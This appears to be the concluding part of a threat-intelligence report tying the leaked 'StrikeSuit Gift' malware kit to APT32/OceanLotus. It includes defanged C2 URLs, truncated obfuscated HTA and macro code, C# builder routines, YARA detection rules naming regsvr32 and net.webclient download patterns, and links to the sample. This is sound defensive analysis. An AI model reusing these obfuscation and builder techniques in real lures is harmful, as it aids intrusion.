Finally, after tedious inspection of this messy pile of data, we can take stock of our indicators, TTPs and other pivots and align the StrikeSuit Gift package with public reporting of named threat actors.

Attribution is a spectrum of course, and along the axis of specificity there are different burdens of proof required to make an attribution. In our case, because we are assessing alignment with a large cluster that is not necessarily a real-life “group” but more a superset of intrusions that transcend years of activity. In our case, a preponderance of evidence will suffice. So let’s begin with dumping a few of the most qualified data points that show connections to APT32 or OceanLotus.

#### ShellcodeLoader L.dll

Foremost, the `L.dll` shellcode loader (MD5 `b28c80ca9a3b7deb09b275af1076eb55`) in the our source package is the same hash as that which is mentioned in this [RedDrip Team blog about OceanLotus](https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/). Beyond being simply the same hash, the _StrikeSuit Gift_ project `WebBuilder/ShellcodeLoader` has all the technical hallmarks of being the source code for this loader, so that’s nice and convenient for us.

The image below has the `ShellcodeLoader` project showing TypeLib Id GUID, which is the same as in the `L.dll` file `b28c80ca9a3b7deb09b275af1076eb55`

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/18-L%20AssemblyInfo.png "L.dll AssemblyInfo")
	
#### XML Timestamps

There are more direct and obvious connections to APT32 (or OceanLotus) in the VB macro and XML scheduled tasks. A quick survey shows that the two XML timestamps observed across multiple projects in the StrikeSuit Gift package (`StartBoundary 2016-06-02T11:12:49.4495965` and `Date 2016-06-02T11:13:39.1668838)` are seen in the macro content of hundreds of malicious documents. Many of these macros designate remote network resources attributed to APT32, OceanLotus and Cobalt Kitty, and so forth.


The table belowo shows sample files containing StartBoundary and Date timestamps `2016-06-02T11:12:49.4495965` and `2016-06-02T11:13:39.1668838`, revealing many overlaps with APT32 and OceanLotus infrastructure.

|File MD5|Example of C2 Address from Macro|C2 Attribution|
|---|---|---|
|`33adc53121634127bd242ebaf98d1da8`|`http[:]//23.227.196.210:80/upload/private/picr.jpg`|APT32 (Mandiant)|
|`e334b21a2c52dcf86ea8c0785044d578`|`http[:]//80.255.3.87:80/a/g/10007.jpg`|APT32 (Mandiant)|
|`2926a94b1cc86738422434c7448dee25`|`http[:]//185.157.79.3:80/update`|APT32 (Mandiant)|
|`387e5e61a4218977a46990b47dfb4726`|`http[:]//contay.deaftone.com/user/upload/img/icon.gif?n=%COMPUTERNAME%`|APT32 (Mandiant)|
|`e47554108ef02e9cdc3a034fea1cb943`|`http[:]//job.supperpow.com:80/pd/random1/randpic/1.jpg`|APT32 (Mandiant)|
|`f87bab14791c3230b43241500870b109`|`\"h\"t\"t\"p://icon.torrentart.com:80/789.jpg`|APT32 (Mandiant)|
|`b7ee7947f9f0179069e6271c4cd58c05`|`http[:]//104.237.218.70:80/a`|APT32 (Mandiant)|
|`919de0e7bd8aaed846a8d9378446320f`|`http[:]//gap-facebook.com/microsoft`|APT32 (Mandiant)|
|`fa6d09f010f11351a92c409fef7ba263`|`http[:]//lawph.info/download/user.ico`|Unknown|
|`5475d81ce3b3e018c33fbc83bdc0aa68`|`http[:]//msofficecloud.org/roffice`|OceanLotus (blevene)|
|`207375c4bd19fd4fa0e5352269bfb88e`|`http[:]//193.169.245.137:80/g4.ico`|APT32 (Mandiant)|
|`ba844b09524aea077f6a175da10a6bf0`|`http[:]//chinanetworkvub.info:80/global/asian.jpg`|Unknown|
|`f46f2252ee955ca5f89429fc5519150f`|`http[:]//update-flashs.com/gpixel.jpg`|APT32 (Mandiant)|
|`d4ec27868e8530ca15daa274ec269bbe`|`http[:]//google-script.com/adobereg.bin`|Cobalt Kitty (CyberReason)|
|`e48cc615a4569175b2ea144928d5b871`|`http[:]//support.chatconnecting.com:80/public/public_pics/rpic.jpg`|OceanLotus (blevene), Cobalt Kitty (CyberReason)|

#### ObfuscationHelper.cs

Taking a step beyond the comfortable immediacy of indicator links, we can take a gander at TTPs associated with _StrikeSuit Gift_ and APT32 such as obfuscation methods.

One of the interesting components of the _StrikeSuit Gift_ package is a piece of source code smartly named ObfuscationHelper. Within the `HtaDotnet` package, the `ObfuscationHelper.cs` code does exactly what it sounds like it does, and has a bunch of functions to help provide jacked up strings when building HTA files with obfuscated macros. There are many layers to this onion. The `ObfuscationHelper`, though, uses arrays of vowels and consonants to build random strings with random casings that appear to be like words.

For example, we can use the `HtaDotnet` project to build a HTA file and we might get code that looks something like this.

```vbscript
Snippets of code extracted from a fabricated test HtaDotnet output .hta file. 
<HTA:APPLICATION iD="KONG" iCON="#" wINDOwstATE='mINiMize' sHOwINtAskbAR='No' />
<script language="vbscript">
on ERror reSume Next
HetGhonCosWewShiw="ZXUWgQaHQl0qUbK9YHZROhNYn0jYAAEAAAD.....AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZ" 
          
JepZacWimQuungGhun="h6m1P3lqH0iwiS0xNaK,wUxEnHR2umtUEJmSvy,fHWQKsadnNWMoLi,4T83Ud8uQOLnzcSqqWAmta9p5DAABAAAA.....wEAAAAAAAAABAEAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHdGFyZ2V0MAdtZXRob2" 

… (truncated)
 
FunctIoN    QuudKisWhaw   (  WhacThes)   
      
QuisVesGupYewFong  = WhacThes 
QuisVesGupYewFong  =ReplAce   ( QuisVesGupYewFong  ," "   , "=")  
  QuisVesGupYewFong= replACE(  QuisVesGupYewFong ,"."  , "/")  
  QuisVesGupYewFong =   replAce   (   QuisVesGupYewFong ,","  ,  "+"   )  
QuudKisWhaw= QuisVesGupYewFong
   ENd FunCtIOn  

…(truncated)

 fuNCtIOn  WhosChem  (   YowDon ,  GongWiwFangLip  ,GidRomShos   ,CiwHap  ,  KepChinGhop ,GinChongYiwQuis)  
  oN eRroR reSume NExT
              
  Set ShepWhud = COpquiwwHEnleT  (  "WScript.Shell"   )   
  ShepWhud.RegRead "HKLM\SOFTWARE\Microsoft\.NETFramework\"+   YowDon+   "\"
…  
```

An analyst looking at just the HTA file might be quick to home in on a couple of unique values such as `<HTA:APPLICATION iD="KONG"`, but we can see in our source code that the value KONG is actually generated by the `ObfuscationHelper`.

Code from to create the randomized HTA header using `ObfuscationHelper`
```vbscript															
htaAttr = ObfuscationHelper.RandomLowerUpperCase("ID=\"" + obs.RandomWords() + "\" icon=\"#\" />");
```

The special sauce of `ObfuscationHelper` begins with three string arrays for vowels and consonants that are later used to build words, which are later checked against a list of special, reserved keywords for the VB macro, so as not to mess that up. We notice that in `CONSONANTS_1` there are a couple of duplicates, perhaps a copy paste error. The vowels will be familiar to most, but how and why are these consonants selected? 

On speculation, we may guess that these consonants (and digraph phonemes, representing small pieces of sound in speech) were selected to help fabricate fake strings that appear to be read like or sound like real language words. The selection of vowels and consonants allows the generation of strings with the right construction, though that is highly dependent on the language. For example, when considered phonetically, Modern English commonly uses the phoneme ð (digraph “th”), whereas the phoneme ɣ (digraph “gh”) is not present. So what does this exact array of consonants imply, and did the developer premeditate the consonants to appear like a particular language? If so, which one? Would Vietnamese be a baseless guess? Or maybe it's random copypasta? Maybe we will never know.

```csharp
ObfuscationHelper Declaring the string arrays
private static readonly string[] VOWELS = new string[] { "a", "e", "i", "o", "u" };
private static readonly string[] CONSONANTS_1 = new string[] { "b", "c", "d", "f", "g", "h", "j", "k", "l", "ch", "gh", "qu", "sh", "th", "wh", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "y", "z", "ch", "gh", "qu", "sh", "th", "wh" };
private static readonly string[] CONSONANTS_2 = new string[] { "c", "d", "m", "n", "p", "ng", "s", "t", "w", "ng" };
```

Cloning new arrays for `ObfuscationHelper()`
```csharp
        public ObfuscationHelper()
        {
            this.m_vowels = CloneStringArray(VOWELS);
            this.m_consonants_1 = CloneStringArray(CONSONANTS_1);
            this.m_consonants_2 = CloneStringArray(CONSONANTS_2);
        }
```

Example of a function using the consonant and vowel arrays to build a randomized word.
  
```csharp
        public string RandomSingleWord(bool autoUpper)
        {
            URandom rand = new URandom();
            int idx1 = rand.Next(0, this.m_consonants_1.Length);
            int idx2 = rand.Next(0, this.m_vowels.Length);
            int idx3 = rand.Next(0, this.m_consonants_2.Length);

            string s = this.m_consonants_1[idx1];
            if (autoUpper)
            {
                string u = s.Substring(0, 1).ToUpper();
                s = u + s.Substring(1);
            }
            s += this.m_vowels[idx2];
            s += this.m_consonants_2[idx3];
            return s;
        }
```

The reason this `ObfuscationHelper` is pertinent to the discussion is that APT32 slash OceanLotus clusters are famous for similar obfuscation and encoding, and they are likely using similar techniques still today.

In 2018, ESET detailed a piece of malware with a library HTTPprov designed to aid in string generation for its URI callbacks. (`190db4e6de3a96955502f3e450428217`)

_Excerpt from ESET OceanLotus Old techniques, new backdoor_
```cpp
buffEnd = ((DWORD)genRand(4) % 20) + 10 + buff;
while (buff < buffEnd){
    b=genRand(16);
    if (b[0] - 0x50 > 0x50)
        t=0;
    else
        *buf++= UPPER(vowels[b[1] % 5]);
    v=consonants[b[1]%21]);
    if (!t)
        v=UPPER(v);
    *buff++= v;
    if (v!=’h’ && b[2] - 0x50 < 0x50)
        *buff++= ‘h’; *buff++= vowels[b[4] % 5];
    if (b[5] < 0x60)
        *buff++= vowels[b[6] % 5]; *buff++= consonants[b[7] % 21];
    if (b[8] < 0x50)
        *buff++= vowels[b[9] % 5]; *buff++= ‘-’;
}; *buff=’\0’;
```
			
In the 2019 OceanLotus report by RedDrip Team, we see this HTA file (MD5 `042f06b110a0a53a7e30b0e0490ea317`) which drops, amongst many other things, the shellcode for a backdoor (MD5 `a8ff3e6abe26c4ce72267154ca604ce3`). The HTA file from the wild has all the look and feel as our HTA test file generated with Obfuscation Helper. This is not surprising, because our ShellcodeLoader shows along with this attack as well, but still nice to see all of these tools playing together nicely in the field.

_Snippets of code from 2019 OceanLotus HTA file_ `042f06b110a0a53a7e30b0e0490ea317`
```vbscript
<HTA:APPLICATION Id="FEtWePQUUdmonyaNg" icoN="#" WINDOWsTATe='mINimIZE' shOWINtasKBar='No' />
<script language="vbscript">
on erROR RESUMe NexT
Quus   = "3F6OPnBc4gv4d10Fv34AulSxgpUAAQAAAP....8BAAAAAAAAAAQBAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIEAAAACERlbGVnYXRlB3RhcmdldDAHbWV0aG9kMAdtZXRob2QxAwcDAzBTeXN0"  
…
 FUNctIon    QuangGhut   ( BongHim )  
 set  QuangGhut= CreAteobjECT (BongHim ) 
 enD FUnCtIon  
…
  FuNCtiOn    NingGhac(ThepGhotChudVong,HengThew   ,ChedBom   ,PitWhiwVeng  )   
   SeT DapVen =  qUAnggHUt   (  "System.Text.ASCIIEncoding")  
  sEt MicSotThasGaw = quAnGghuT   ( "System.Security.Cryptography.FromBase64Transform") 
 SEt QuengZiwGhat  = QUANGgHUt   (  "System.IO.MemoryStream")
  QuengZiwGhat.Write  MicSotThasGaw.TransformFinalBlock (   DapVen.GetBytes_4  (ThepGhotChudVong)   ,  0   ,   HengThew)   ,   0  ,  ChedBom  
   QuengZiwGhat.Position = PitWhiwVeng  

 SeT  NingGhac = QuengZiwGhat
 eND fUNCtIon  
```

When we execute that HTA in a virtual machine out pops a backdoor, fresh as a newborn fawn. The backdoor makes HTTP POST requests with URIs that appear to contain fake, randomized words likely using some variation of the custom `HTTPprov` library previously described by ESET. 

HTTP POST requests with randomized word URIs from backdoor in 2019 OceanLotus HTA file `042f06b110a0a53a7e30b0e0490ea317`

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/19-HTTP%201.png "HTTP POST from 042f06b110a0a53a7e30b0e0490ea317")
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/20-HTTP%202.png "HTTP POST from 042f06b110a0a53a7e30b0e0490ea317")
	
```
“udt.sophiahoule[.]com”
"ipv6.ursulapapst[.]xyz"
“location.allannicolle[.]com”
```

A [2019 blog by NSFOCUS](http://blog.nsfocus.net/apt32-organization-denesrat-trojan-related-attack-chain-analysis/) examines this exact backdoor and demonstrates the URI generation algorithm as using generating the vowels and consonants array as `aAeiou` and `aBcdyzfghjklpwr`, respectively. This technique by HTTPprov is clearly different from the approach in the `ObfuscationHelper` project, yet these methods show the developers behind APT32 (and OceanLotus) malware kits wish to provide flexible functionalities that create fake, randomized strings that look almost-but-not-quite like real words. This is an important piece of tradecraft because it is something we track and study as the developers evolve the toolset.

_NSFOCUS depictions of the URI generation algorithm_

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/21-Algo1.png "URI generation algorithm courtesy of NSFOCUS")
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/21-Algo2.png "URI generation algorithm courtesy of NSFOCUS")

### APT32 Then and Now

The _StrikeSuit Gift_ package of malware is undoubtedly linked to APT32 based on the `ShellcodeLoader` and the XML timestamps that draw concrete connections to attributed APT32, OceanLotus, Cobalt Kitty and other monikers for this rampant threat actor. 
 
Looking at the obfuscation and randomization tradecraft from _StrikeSuit Gift_’s `ObfuscationHelper`, we can see similarities in other OceanLotus projects such as the `HTTPprov` library that helps generate fake URIs for backdoor C2 schemas. 

Instead of looking at the actor’s evolution forward in time, we are here in 2022 taking stock of the attacks we see today and connecting the dots back to the puzzle pieces of the past. APT32 has certainly not been sleeping since 2017, time marches on and lots has changed. But what has stayed the same?

Netskope Threat Labs detailed a [2022 APT32 operation using MHT lure files](https://www.netskope.com/blog/abusing-microsoft-office-using-malicious-web-archive-files) and C2 via the legitimate web service Glitch.me. The initial lure documents were shipped in a RAR file. Taking a peek at one of these RARs, we can see the last modified time has modernized to the eight byte Windows FILETIME, so we know the actor is using WinRAR 5+ with defaults for high-precision timestamps, just like the rest of us. 

Inside of an example RAR file for this campaign, we find a MHT file with a .doc extension, and we see that the document has an Alternate Data Stream ZoneId of 2. It's no coincidence that this is the same approach taken in _StrikeSuit Gift_’s  `Macros_Builder`.

Using PowerShell to tease out the ADS Zone Identifier for 2022 MHT 92f5f40db8df7cbb1c7c332087619afa
```powershell
PS C:\Users\user\Desktop> Get-Item -path C:\Users\user\Desktop\HS.doc -stream Zone.Identifier
…
FileName      : C:\Users\user\Desktop\HS.doc
Stream        : Zone.Identifier
Length        : 24

 PS C:\Users\user\Desktop> Get-Content C:\Users\user\Desktop\HS.doc -stream Zone.Identifier
[ZoneTransfer]
ZoneId=2
```


Routine from 2017 Macros_Builder\Form1.cs to add ADS Zone Identifier for input files
```csharp
       private void buttonCreate_Click(object sender, EventArgs e)
       {
           if (textBoxADS.Text.Trim().Length <= 0)
           {
               MessageBox.Show("Missing path!");
               return;
           }
           string StreamName = "Zone.Identifier";
           FileInfo ADSFile = new FileInfo(textBoxADS.Text.Trim());
           if (ADSFile.AlternateDataStreamExists(StreamName))
           {
               AlternateDataStreamInfo s = ADSFile.GetAlternateDataStream(StreamName, FileMode.Open);
               s.Delete();
           }
           AlternateDataStreamInfo FileADS = ADSFile.GetAlternateDataStream(StreamName, FileMode.OpenOrCreate);
           using (FileStream TWriter = FileADS.OpenWrite())
           {
               string ZoneTrust = "[ZoneTransfer]\r\nZoneId=2";
               using(StreamWriter FStreamWriter = new StreamWriter(TWriter))
               {
                   FStreamWriter.AutoFlush = true;
                   FStreamWriter.Write(ZoneTrust);
               }
           }

           MessageBox.Show("Alternative Data Stream OK!", "Complete!", MessageBoxButtons.OK, MessageBoxIcon.Information);
       }
```

Diving further into Glitch.me campaign samples, in one MHT, we extract and base64 decode the content of Content-Location: `file:///C:/604BB24E/DeliveryInformation_files/editdata.mso` to arrive at an ActiveMime blob, which we can decode with oledump and then view the VB macro content.

```
C:\Users\user\Desktop>oledump ActiveMime.bin
  1:       442 'PROJECT'
  2:        41 'PROJECTwm'
  3: M   13478 'VBA/ThisDocument'
  4:      3452 'VBA/_VBA_PROJECT'
  5:       633 'VBA/dir'
```

The modern macro content is annoyingly encoded with randomized function and parameter strings and tedious char evaluations of octal, hex and decimal added and subtracted together. 

```vbscript
MA5SIed2hG218yR = Chr((121 - &0164 + &H50)) & Chr((143 + &HD2 - &HE))...
```

We can do a quick check of these using Python. First we find and replace all “&0” and and “&H” and replace those with 0o and 0x prefixes that are Python friendly. Replace any &s with +s and now we’re cookin with fire. This is the exact approach that researcher [Gustavo Palazolo took in this script](https://github.com/stvemillertime/NetskopeThreatLabsIOCs/blob/main/MHTGlitch/script/deobfuscate_macro_strings.py) to help decode the macro strings, but we’re demonstrating it here for extra fun. 

```python
MA5SIed2hG218yR = Chr((121 - 0o164 + 0x50)) + Chr((143 + 0xD2 - 0xEE))...
```

Next just test out one a couple expressions at the Python CLI. 

```python
>>> z = "121 - 0o164 + 0x50"
>>> print(chr(evaluate(z)))
U
>>> MA5SIed2hG218yR = chr(evaluate("121 - 0o164 + 0x50")) + chr(evaluate("143 + 0xD2 - 0xEE")) + chr(evaluate("0xC0 - 0xB3 + 0o130")) + chr(evaluate("147 - 156 + 0o173")) + chr(evaluate("13 + 0x13")) + chr(evaluate("0x48 - 0o222 + 0o213")) + chr(evaluate("0o212 - 0xAF + 0o210")) + chr(evaluate("0x9F + 0xA0 - 220")) + chr(evaluate("0o220 + 88 - 0o171")) + chr(evaluate("113 + 0x4")) + chr(evaluate("170 - 0x8F + 83")) + chr(evaluate("196 - 0x50"))
>>> print(MA5SIed2hG218yR)
User Account
```

Now that we know this works, one might run through and clean up the obfuscated VB into more of a human readable text and begin to tease out the innards of the macro. 

```vbscript
Private Sub ePtqP5mQjVHX4H()
    On Error Resume Next
    aGJ5m9Jtam95y = "Microsoft Outlook Sync"
    V9sMn9FaY = "TL284151.doc"
    Dim MA5SIed2hG218yR As String
    MA5SIed2hG218yR = "User Account"
    RCGt2dyOgy5
    MA5SIed2hG218yR = MA5SIed2hG218yR + "Pictures"
    E0xI2h2kKxi9ra = "background.dll"
    w2cHY5K1n = "\guest.bmp"
    yR1QBm2tf10 = ThisDocument.FullName
    MA5SIed2hG218yR = "\Microsoft\" + MA5SIed2hG218yR + w2cHY5K1n
    MA5SIed2hG218yR = Environ("AllUsersProfile") + MA5SIed2hG218yR
    kMcnWThP5l = Environ("AllUsersProfile") + "\" + aGJ5m9Jtam95y
    Dim b6Ot02TnO5CCSH8() As String
    b6Ot02TnO5CCSH8 = Split(kMcnWThP5l, "\")
    cache = b6Ot02TnO5CCSH8(LBound(b6Ot02TnO5CCSH8))
    For PxSn9cV7c = LBound(b6Ot02TnO5CCSH8) + 1 To UBound(b6Ot02TnO5CCSH8)
        cache = cache + "\" + b6Ot02TnO5CCSH8(PxSn9cV7c)
        MkDir cache
```

Even when partially decoded, this payload macro might appear to have little to do with _StrikeSuit Gift_ `Macros_Builder` source code. But our guess is that if someone analyzes enough of the new APT32 macros, they will see similarities in how the malware developer uses VB to write binary data, perform randomized string generation, or error handling.

It's not unreasonable to imagine that these 2022 MHT and macro payloads were created with heavily modernized versions of the tooling found throughout the _StrikeSuit Gift_ package. The final backdoor from this campaign purportedly uses a Windows Scheduled Task for persistence. Some things never change.

---

# Epilogue

> _“The Gods themselves cannot recall their gifts.” Tennyson_

In our analysis of _StrikeSuit Gift_, we did a quick and dirty inspection of the source code, we took a gander at the macro builders, and we sifted through the malware and the slew of artifacts that came along with it. We observed the evolutionary timeline of several interdependent code projects and we established connections to the threat actor APT32.

Part of the thrill of threat analysis is that most investigations end not with final answers but with new questions. We dusted off this archaic tome of APT32 macros, and through our analysis, we discovered fresh starting points for tracking the threat actor into the future. Intrusion operations come and go, but threat actors are forever.

We plan to continue sharing unique analysis to help advance the field of threat intelligence but also to engage and inspire the next generations of threat analysts. We hope that this origin story and exposé was informative, or at least a little bit fun. Holler if you’ve got questions, comments, corrections, or something to add; otherwise, see you around the internet.

---

# Appendix

## YARA Rules

These precise YARA rules may help bubble up files related to APT32 and StrikeSuit Gift.

```yara
rule APT32_WebBuilder_ShellcodeLoader_L_dll_timestamp {
  meta:
    author = "Stairwell"
    ref = "P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\WebBuilder\\ShellcodeLoader\\Test\\bin\\Release\\L.dll"
  condition:
    pe.timestamp == 1242474426
}
rule APT32_MacrosBuilder_add_schedule_vba_txt_date {
  meta:
    author = "Stairwell"
  ref = "P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt"
  strings:
    $a = "2016-06-02T11:13:39.1668838" ascii wide
  condition:
    $a
}
rule APT32_MacrosBuilder_add_schedule_vba_txt_startboundary {
  meta:
    author = "Stairwell"
    ref = "P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt"
  strings:
    $a = "2016-06-02T11:12:49.4495965" ascii wide
  condition:
    $a
}
rule APT32_MacrosBuilder_add_schedule_vba_txt_regsvr32_to_uri {
  meta:
    author = "Stairwell"
    ref = "P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.txt"
  strings:
    $a = "\"\"\\\"\"regsvr32.exe\\\"\" /s /n /u /i:http"
  condition:
    $a
}
rule APT32_ActiveMime_Lure {
  meta:
    ref = "https://www.mandiant.com/resources/cyber-espionage-apt32"
    courtesy_of = "@Mandiant @TekDefense and @itsreallynick"
  strings:
    $a = "office_text" ascii wide
    $b = "schtasks /create tn" nocase ascii wide
    $c = "scrobj.dll" nocase ascii wide
    $d = "new-object net.webclient" ascii wide
    $e = "GetUserName" ascii wide
    $f = "WSHnet.UserDomain" ascii wide
    $g = "WSHnet.UserName" ascii wide
  condition:
    4 of them
}
rule APT32_Macros_Builder_add_schedule_vba_SpawnBase63 {
  meta:
    author = "Stairwell"
    ref = "See HtaDotNetBuilder and HtaDotnet.cs"
  strings:
    $a = "SpawnBase63" nocase ascii wide
    $b = "SpawnBase63" base64 base64wide
    $c = "SpawnBase63" xor(0x01-0xff)
  condition:
    any of them
}
```
These broad YARA rules may help surface or identify files with exported XML scheduled tasks.

```yara
rule TTP_XML_Scheduled_Task_Date_pcre {
  meta:
    author = "Stairwell"
    desc = "XML Scheduled task strings with a Date that has seven digits of precision, since no reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler."
  strings:
    $xml = "<?xml version=\""
    $task_xml = "<Task version=\""
    $pcre = /<Date>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{7}<\/Date>/ nocase ascii wide
  condition:
  all of them
}
rule TTP_XML_Scheduled_Task_StartBoundary_pcre {
  meta:
    author = "Stairwell"
    desc = "XML Scheduled task strings with a Date that has seven digits of precision, since no reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler."
  strings:
    $xml = "<?xml version=\""
    $task_xml = "<Task version=\""
    $pcre = /<StartBoundary>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{7}<\/StartBoundary>/ nocase ascii wide
  condition:
    all of them
}
```
## VTI Queries

Malware developers may inadvertently leak source code packages to VirusTotal, and you can find them
by searching for odd bundles with artifacts of the development process. Try different artifacts and
different packaging types.

```
content:".csproj" type:rar positives:1+ fs:2022-04-01+

content:".sln" type:rar positives:1+ fs:2022-04-01+

content:".suo" type:rar positives:1+ fs:2022-04-01+

content:".pdb" type:rar positives:1+ fs:2022-04-01+

content:".pyc" type:rar positives:1+ fs:2022-04-01+
```

## "Indicators"

Look, it’s kind of a pain to give all the atomic indicators to you in a way that is easy or sensibly useful. If we print out just MD5s, someone will ask for SHA256s, and if we give SHA256s, someone else will ask for SHA387s. This isn’t the type of report that is really about the indicators anyway, as many of them are so old it doesn't really matter.

If you want to take a gander at the StrikeSuit Gift tooling, we provide links below. Jump in and get dirty! Looking at the source code is fun and instructive. If you are an intelligence analyst and trying to play the game of connect the dots for purposes of attribution, we recommend you start with the main StrikeSuit Gift RAR file and do your own hashing and IOC extraction from there.

### StrikeSuit Gift RAR File

- MD5: 2cac346547f90788e731189573828c53
- SHA256: 66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422
- [See it in Malshare](https://malshare.com/sample.php?action=detail&hash=66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422)
- [See it in VT](https://www.virustotal.com/gui/file/66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422/submissions)

## Links and References

...
